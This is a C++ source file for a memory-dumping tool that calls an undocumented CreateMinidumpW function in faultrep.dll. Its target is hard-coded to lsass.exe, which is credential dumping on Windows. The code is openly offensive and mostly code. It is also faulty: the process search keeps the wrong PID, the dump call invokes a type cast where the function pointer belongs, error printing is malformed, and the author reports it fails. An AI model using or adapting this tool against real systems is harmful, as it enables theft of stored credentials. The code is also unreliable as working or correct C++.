//Process Dumper using undocumented CreateMinidumpW Win32API

/*
Win32Api Defination:
  CreateMinidumpW(DWORD ProccessID , LPCWSTR lpFileName, int 0)
  Discovered by : @OsandaMalith 
  
Tested over : Win10 17134, 
What to do :
 * Save faultrep.dll to same dir as of compiled program
 * change name of proc in procname variable in main(). I used lsass.exe during tests.
Expectation :
  * Should create dump of defined proc into current dir with name dump.bin
Notes : Able to find export, hitting with error : The requested lookup key was not found in any active activation context.
If your windows is activated, do give it a try and DM me :)
*/

#include <windows.h>
#include <iostream>
#include "tlhelp32.h"
#include "libloaderapi.h"


typedef int(__stdcall* f_funci)(DWORD ProccessID, LPCWSTR lpFileName, int n);

int Dumper(char* procname) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	auto pe = PROCESSENTRY32{ sizeof(PROCESSENTRY32) };
	LPCWSTR f = L"dump.bin";

	if (!Process32First(snapshot, &pe))
	{
		printf("error : Process32First\n ");
		CloseHandle(snapshot);          // clean the snapshot object
	}
	else {
		do {
			if (strcmp(procname, pe.szExeFile) == 0) {
				printf("Banged! : %d\n", pe.th32ProcessID);
			}
		} while (Process32Next(snapshot, &pe));
	}
	HINSTANCE faultrep = LoadLibrary("faultrep.dll");
	f_funci funci = (f_funci)GetProcAddress(faultrep,"CreateMinidumpW");
	if (!funci) {
		printf("\nFailed to get CreateMinidumpW , %d",GetLastError());
	}
	else {
		printf("\nDumping Proc\n");
		if (!(f_funci)(pe.th32ProcessID, f, 0)) { 
			printf("%s", GetLastError());
		}
	}
	//printf("%s",funci);
	return 0;
}

int main() {
	char procname[] = "lsass.exe";
	Dumper(procname);
	return 0;
}
